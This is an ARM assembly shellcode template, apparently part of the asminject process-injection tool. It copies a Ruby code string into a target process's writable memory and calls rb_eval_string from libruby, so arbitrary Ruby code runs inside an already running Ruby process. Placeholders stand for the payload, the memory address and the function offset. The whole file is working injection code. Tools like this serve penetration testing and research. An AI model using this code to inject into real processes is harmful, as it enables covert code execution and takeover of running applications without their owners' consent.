// executes arbitrary Ruby code in an existing Ruby process

[FRAGMENT:asminject_copy_bytes.s:FRAGMENT]

// load a pointer to the Ruby code
	mov r0, pc
	b load_destination_address

ruby_code:
	.ascii "[VARIABLE:rubycode:VARIABLE]\0"
	.balign 4

load_destination_address:
	// r0 (source) is already set to code address
	ldr r7, [pc] 	@ Set r7 to the base read/write memory address
	b copy_code_to_rw_memory

read_write_address:
	.word [VARIABLE:ARBITRARY_READ_WRITE_DATA_ADDRESS:VARIABLE]
	.balign 4

copy_code_to_rw_memory:
	// Set r1 (destination) to the base read/write memory address
	mov r1, r7
	// Add 0x80 to save some space to work with before the variable-length string
	add r1, r1, #0x80
	mov r2, #[VARIABLE:rubycode.length:VARIABLE]
	add r2, r2, #0x1	@ null terminator
	push {r7}
	bl asminject_copy_bytes
	pop {r7}
	
// BEGIN: call rb_eval_string
// get the offset of the rb_eval_string function
load_rb_eval_string_offset:
	ldr r8, [pc]
	b call_rb_eval_string

rb_eval_string_offset:
	.word [FUNCTION_ADDRESS:rb_eval_string:IN_BINARY:.+/libruby[0-9\.so\-]+$:FUNCTION_ADDRESS]
	.balign 4

call_rb_eval_string:
	mov r0, r7
	add r0, r0, #0x80
	push {r7}
	push {r8}
	push {r9}
	blx r8
	pop {r9}
	pop {r8}
	pop {r7}
	// store handle in read/write memory
	str r0, [r7]
// END: call rb_eval_string

SHELLCODE_SECTION_DELIMITER

